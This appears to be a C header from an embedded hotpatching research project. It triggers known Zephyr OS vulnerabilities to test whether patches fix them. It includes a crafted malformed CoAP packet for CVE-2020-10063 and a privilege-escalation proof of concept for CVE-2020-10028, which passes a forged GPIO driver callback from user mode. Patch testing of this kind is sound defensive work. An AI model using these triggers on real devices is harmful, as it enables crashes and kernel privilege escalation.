#ifndef CVE_TRIGGER_H_
#define CVE_TRIGGER_H_
#include "hotpatch/include/utils.h"
#include "hotpatch/include/profiling.h"
#include "dummy_cve.h"
#include "hotpatch/include/fixed_patch_points.h"

typedef void (*trigger_func)(void);

extern int test_dynamic_bug(int val);

static void this_is_cve_trigger_func(void) {
	DEBUG_LOG("run test_func: 0x%08x\n", (uint32_t) test_dynamic_bug);
	int eid = profile_add_event("dummy cve start");
	int inputs[] = {4500, 2000};
	profile_start(0);
	profile_end(0);
	profile_dump(0);
	for (int i = 0; i < 1; i++) {
		profile_start(0);
		int v = test_dynamic_bug(inputs[i]);
		profile_end(0);
		profile_dump(0);
		//profile_dump(1);
		// profile_start(2);
		DEBUG_LOG("[%04d] is bug fixed? %s\n", i, v == 0 ? "yes": "no");
		// profile_end(2);
		// profile_dump(2);
	}
	//DEBUG_LOG("finish test_func: 0x%08x\n", (uint32_t) test_dynamic_bug);
}

#ifdef ZEPHYR_OS
#include <zephyr.h>
#include <misc/printk.h>
#include <net/coap.h>
#include <gpio.h>

static void zephyr_cve_2020_10063(void)
{
	unsigned char testcase[] = {
		0, 0, 0, 0,
		0x0E, /* delta=0, length=14 */ // COAP_OPTION_EXT_14 = 14
		0xFE, 0xF0, /* First option */
		0x00 /* More data following the option to skip the "if (r == 0) {" case */
	};
	testcase[5] = testcase[6] = 1;
	DEBUG_LOG("vul func addr: 0x%08x\n", coap_packet_parse);
	struct coap_packet pkt;
	int ret;
	int eid = profile_add_event("coap start");
	profile_start(EV0);
	profile_end(EV0);
	ret = coap_packet_parse(&pkt, testcase, sizeof(testcase), NULL, 0);
	//profile_end(eid);
	profile_dump(EV0);
	profile_dump(EV1);
	DEBUG_LOG("ret = %d\n", ret);
}

static void print_control(const char *s) {
	uint32_t control;
	__asm__ volatile ("mrs %0, CONTROL" : "=r"(control));
	printk("%s - CONTROL: 0x%X\n", s, control);
}

static void escalate(void) {
	print_control("escalated");
	// while (1) {}
}

static void mqtt_cve_10062() {
	
}

static void user(void *p1, void *p2, void *p3) {
	struct gpio_driver_api api;
	struct device port;
	print_control("user");
	api.enable_callback = (void*)escalate;
	port.driver_api = &api;
	gpio_enable_callback(&port, 0, 0);
}

static void zephyr_cve_2020_10028(void) {
	print_control("kernel");
	k_thread_user_mode_enter(user, NULL, NULL, NULL);
}

trigger_func dynamic_trigger_func_list[] = {
	this_is_cve_trigger_func,
	zephyr_cve_2020_10063,
	zephyr_cve_2020_10028,
};

// Fixed Patch point


trigger_func fixed_trigger_func_list[] = {
	test_fixed_patch_point,
};


#else

trigger_func dynamic_trigger_func_list[] = {
	this_is_cve_trigger_func,
};

trigger_func fixed_trigger_func_list[] = {
	test_fixed_patch_point,
};

#endif // ZEPHYR_OS

#endif // CVE_TRIGGER_H_